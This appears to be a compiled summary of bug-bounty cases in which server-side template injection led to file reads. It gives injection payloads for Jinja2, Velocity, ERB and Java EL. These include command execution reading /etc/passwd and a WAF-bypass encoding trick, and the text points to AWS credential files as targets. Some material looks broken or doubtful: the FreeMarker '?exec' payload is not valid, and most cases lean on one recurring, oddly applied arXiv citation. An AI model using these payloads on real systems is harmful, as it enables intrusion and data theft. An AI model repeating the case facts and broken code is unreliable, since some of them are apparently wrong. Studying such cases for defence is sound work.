## Real-World Bounty Cases Involving SSTI → File Enumeration

### 1. **Uber – Jinja2 SSTI (2016)**

* A HackerOne bounty report revealed an SSTI in Uber's templates using **Jinja2**, allowing remote code execution (RCE). The bounty was awarded for this critical path. ([arXiv][1])
* This kind of RCE invariably enables reading local files like `/etc/passwd`, configuration files, or environment variables via payloads such as:

  ```jinja
  {% raw %}
  {{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
  {% endraw %}
  ```

### 2. **Ubiquiti – Twig SSTI (2017)**

* A report to Ubiquiti confirmed SSTI in a Twig-powered component, effectively enabling Local File Inclusion (LFI). Bounty valued at **\$1,000+**. ([arXiv][1])
* Twig supports file-reading filters like `file()` or `file_excerpt()`, so typical exploitation looks like:

  ```twig
  {% raw %}
  {{ '/etc/passwd'|file_excerpt(0,100) }}
  {% endraw %}
  ```

### 3. **Shopify – Handlebars SSTI (2018)**

* Another real-world SSTI case on Shopify involved Handlebars templates with potential RCE, earning a \$10,000 bounty. ([arXiv][1])
* File enumeration in Handlebars is less straightforward, but custom helpers or poor sandboxing could be abused to read sensitive files.

### 4. **Mail.ru – Velocity SSTI (2019)**

* A High-impact RCE via Velocity SSTI was reported to Mail.ru, paying out around **\$2,000**. ([arXiv][1])
* A typical inject payload:

  ```velocity
  #set($rt = "".getClass().forName("java.lang.Runtime").getRuntime())
  #set($cmd = $rt.exec("cat /etc/passwd"))
  $cmd.getInputStream()
  ```

### 5. **U.S. Department of Defense – FreeMarker SSTI (2022)**

* A critical-level FreeMarker SSTI impacting DoD systems was documented (no bounty listed) in 2022. ([YouTube][2], [Reddit][3])
* FreeMarker allows direct injection of exec calls:

  ```ftl
  <#assign f = "cat /etc/passwd"?exec>
  ${f}
  ```

### 6. **Apache Airflow – Jinja2 SSTI (2022)**

* A vulnerability in Apache Airflow using Jinja2 resulted in RCE, awarded **\$1,000+**, and associated with CVE-2022-38362. ([Reddit][3], [arXiv][1])
* This payload is commonly successful:

  ```jinja
  {% raw %}
  {{ ''.__class__.__mro__[1].__subclasses__()[…]('/etc/passwd').read() }}
  {% endraw %}
  ```

### 7. **GitHub Security Lab – Ruby (ERB, Slim SSTI) (2023)**

* Research from GitHub's Security Lab uncovered SSTI in Ruby template engines (ERB, Slim), enabling file access; the bounty was **\$2,300**. ([InfoSec Write-ups][4], [arXiv][1])
* An ERB example:

  ```erb
  <%= File.read('/etc/passwd') %>
  ```

## Community Write-Up: SSTI → File Enumeration on a Leading Asian Payment System

From Medium: **"Doing it the researcher's way…"** by JzeeRx details how SSTI enabled file enumeration in a payment system in Asia. ([Medium][5])

* Verified SSTI via a simple arithmetic payload `${7*7}` returning `49`.
* Then experimented with Java EL chaining, bypassing WAF by encoding parentheses:

  ```java
  ${'b'.getClass().forName('javax.script.ScriptEngineManager')
      .newInstance().getEngineByName('nashorn')
      .eval\u0028'java.lang.System.getProperty("user.home")')}
  ```

  → This successfully disclosed the application user’s home directory.
* Clearly shows how creative encoding and understanding of EL can lead to file enumeration, even through mitigations.

## Key Insights & Low-Level Chain Analysis

* **Engine-Specific Primitives**:

  * *Jinja2*: class traversal (`__globals__`, `.read()`)
  * *Twig*: built-in file filters
  * *Velocity*: Java `Runtime.exec()`
  * *FreeMarker*: `?exec` directive
  * *ERB / Slim*: direct Ruby calls to `File.read`

* **WAF Bypass & Encodings**:

  * Example: replacing parentheses with `\u0028` to evade detection (as shown in the Medium write-up).

* **File Targets**:

  * Common files: `/etc/passwd`, environment files, configs (e.g. `settings.py`, `application.properties`), home directory, AWS credential files.
  * Leverage introspection and class chains to pivot from SSTI to file access.
